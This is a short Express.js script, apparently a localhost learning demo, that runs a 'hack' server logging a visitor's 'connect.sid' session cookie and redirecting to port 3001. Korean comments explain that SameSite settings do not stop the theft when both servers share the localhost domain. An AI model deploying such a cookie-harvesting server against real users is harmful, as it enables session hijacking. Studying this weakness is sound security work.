const express = require('express');
const cookie = require('cookie-parser');

const app = express();

app.use(cookie());

app.get('/', (req, res) => {
  console.log(req.cookies['connect.sid'])
  res.redirect('http://localhost:3001');
  res.end();
  // * 다른 포트에서 세션값을 탈취 할 수 있음. 지금은 똑같은 localhost 도메인을 사용 중이여서 app.js에서 쿠키설정에 same site를 설정해줘도 전부 탈취가능한것임.
})

app.listen(3002, () => {
  console.log('hack 서버 3002포트.')
});